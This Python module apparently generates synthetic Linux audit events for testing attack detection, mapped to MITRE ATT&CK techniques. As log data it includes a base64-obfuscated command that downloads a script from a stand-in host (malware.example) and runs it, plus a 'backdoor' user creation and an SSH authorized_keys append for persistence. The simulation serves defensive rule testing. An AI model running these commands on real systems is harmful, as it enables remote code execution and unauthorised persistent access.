"""
simulator/generators/linux.py — Linux platform event generator.

Generates ECS-formatted audit/process events for Linux attack techniques
mapped to Fawkes C2 capabilities and MITRE ATT&CK.
"""
from __future__ import annotations

from simulator.generators import (
    PlatformGenerator,
    _now_iso,
    _random_pid,
    _random_uid,
)

_LINUX_HOSTNAMES = ["LNX-WEB-01", "LNX-APP-01", "LNX-DB-01", "LNX-DEV-01"]
_LINUX_USERS = ["jsmith", "agarcia", "www-data", "deploy", "ubuntu"]


def _generate_linux_process_create(
    cmd: str,
    args: list,
    user: str,
    hostname: str,
    technique_id: str,
) -> dict:
    return {
        "@timestamp": _now_iso(),
        "event": {
            "category": "process",
            "type": "start",
            "kind": "event",
            "module": "auditd",
            "dataset": "auditd.log",
        },
        "agent": {"type": "auditbeat"},
        "host": {
            "name": hostname,
            "os": {"family": "linux", "platform": "ubuntu"},
        },
        "process": {
            "name": cmd,
            "executable": f"/usr/bin/{cmd}",
            "args": args,
            "command_line": f"{cmd} {' '.join(str(a) for a in args)}",
            "pid": _random_pid(),
            "parent": {"name": "bash", "pid": _random_pid()},
        },
        "user": {
            "name": user,
            "id": "0" if user == "root" else str(_random_uid()),
        },
        "auditd": {
            "log": {"record_type": "SYSCALL"},
            "data": {"syscall": "execve"},
        },
        "_simulation": {
            "type": "attack",
            "technique": technique_id,
            "platform": "linux",
        },
    }


class LinuxGenerator(PlatformGenerator):
    """Generates Linux audit/process events for attack simulation and baselines."""

    platform = "linux"
    event_types = ["process_create", "file_create", "user_auth", "cred_acquire"]

    def generate_attack(self, technique_id: str, **kwargs) -> list[dict]:
        hostname = kwargs.get("hostname", "LNX-WEB-01")
        user = kwargs.get("user", "root")

        if technique_id == "T1053.003":
            return self._t1053_003(hostname, user)
        elif technique_id == "T1059.004":
            return self._t1059_004(hostname, user)
        elif technique_id == "T1098":
            return self._t1098(hostname, user)
        elif technique_id == "T1136.001":
            return self._t1136_001(hostname, user)
        else:
            return []

    def generate_benign(self, event_type: str = "process_create", count: int = 5) -> list[dict]:
        import random as _rnd
        benign_cmds = [
            ("bash", ["--login"]),
            ("python3", ["/opt/app/manage.py", "runserver"]),
            ("apt-get", ["update"]),
            ("cron", ["-f"]),
            ("systemctl", ["status", "nginx"]),
            ("ls", ["-la", "/var/log"]),
            ("grep", ["-r", "error", "/var/log/syslog"]),
            ("ps", ["aux"]),
            ("df", ["-h"]),
            ("top", ["-bn1"]),
        ]
        events = []
        for _ in range(count):
            cmd, args = _rnd.choice(benign_cmds)
            hostname = _rnd.choice(_LINUX_HOSTNAMES)
            user = _rnd.choice(_LINUX_USERS)
            ev = _generate_linux_process_create(cmd, args, user, hostname, "baseline")
            ev["_simulation"] = {"type": "baseline", "platform": "linux", "expected_match": False}
            events.append(ev)
        return events

    # ── Technique implementations ──────────────────────────────────────

    def _t1053_003(self, hostname: str, user: str) -> list[dict]:
        """T1053.003 — Scheduled Task/Job: Cron (crontab -e by root)."""
        ev = _generate_linux_process_create(
            cmd="crontab",
            args=["-e"],
            user="root",
            hostname=hostname,
            technique_id="T1053.003",
        )
        # Add file write artifact for the crontab edit
        file_ev = {
            "@timestamp": _now_iso(),
            "event": {
                "category": "file",
                "type": "change",
                "kind": "event",
                "module": "auditd",
                "dataset": "auditd.log",
                "action": "opened-file",
            },
            "agent": {"type": "auditbeat"},
            "host": {
                "name": hostname,
                "os": {"family": "linux", "platform": "ubuntu"},
            },
            "file": {
                "path": "/var/spool/cron/crontabs/root",
                "name": "root",
                "directory": "/var/spool/cron/crontabs",
            },
            "process": {
                "name": "crontab",
                "executable": "/usr/bin/crontab",
                "pid": _random_pid(),
            },
            "user": {"name": "root", "id": "0"},
            "auditd": {"log": {"record_type": "PATH"}, "data": {"syscall": "open"}},
            "_simulation": {
                "type": "attack",
                "technique": "T1053.003",
                "platform": "linux",
                "expected_match": True,
            },
        }
        ev["_simulation"]["expected_match"] = True
        return [ev, file_ev]

    def _t1059_004(self, hostname: str, user: str) -> list[dict]:
        """T1059.004 — Command and Scripting Interpreter: Unix Shell."""
        b64_payload = "d2dldCBodHRwOi8vbWFsd2FyZS5leGFtcGxlL3BheWxvYWQuc2ggLU8gL3RtcC8uc3ZjICYmIGJhc2ggL3RtcC8uc3Zj"
        ev = _generate_linux_process_create(
            cmd="bash",
            args=["-c", f"eval $(echo {b64_payload} | base64 -d)"],
            user=user,
            hostname=hostname,
            technique_id="T1059.004",
        )
        ev["_simulation"]["expected_match"] = True
        return [ev]

    def _t1098(self, hostname: str, user: str) -> list[dict]:
        """T1098 — Account Manipulation: SSH Authorized Keys."""
        ev = _generate_linux_process_create(
            cmd="tee",
            args=["-a", "/home/jsmith/.ssh/authorized_keys"],
            user="root",
            hostname=hostname,
            technique_id="T1098",
        )
        file_ev = {
            "@timestamp": _now_iso(),
            "event": {
                "category": "file",
                "type": "change",
                "kind": "event",
                "module": "auditd",
                "dataset": "auditd.log",
                "action": "opened-file",
            },
            "agent": {"type": "auditbeat"},
            "host": {
                "name": hostname,
                "os": {"family": "linux", "platform": "ubuntu"},
            },
            "file": {
                "path": "/home/jsmith/.ssh/authorized_keys",
                "name": "authorized_keys",
                "directory": "/home/jsmith/.ssh",
            },
            "process": {
                "name": "tee",
                "executable": "/usr/bin/tee",
                "args": ["-a", "/home/jsmith/.ssh/authorized_keys"],
                "pid": _random_pid(),
            },
            "user": {"name": "root", "id": "0"},
            "auditd": {"log": {"record_type": "PATH"}, "data": {"syscall": "open"}},
            "_simulation": {
                "type": "attack",
                "technique": "T1098",
                "platform": "linux",
                "expected_match": True,
            },
        }
        ev["_simulation"]["expected_match"] = True
        return [ev, file_ev]

    def _t1136_001(self, hostname: str, user: str) -> list[dict]:
        """T1136.001 — Create Account: Local Account (useradd)."""
        ev = _generate_linux_process_create(
            cmd="useradd",
            args=["--shell", "/bin/bash", "backdoor"],
            user="root",
            hostname=hostname,
            technique_id="T1136.001",
        )
        ev["_simulation"]["expected_match"] = True
        return [ev]
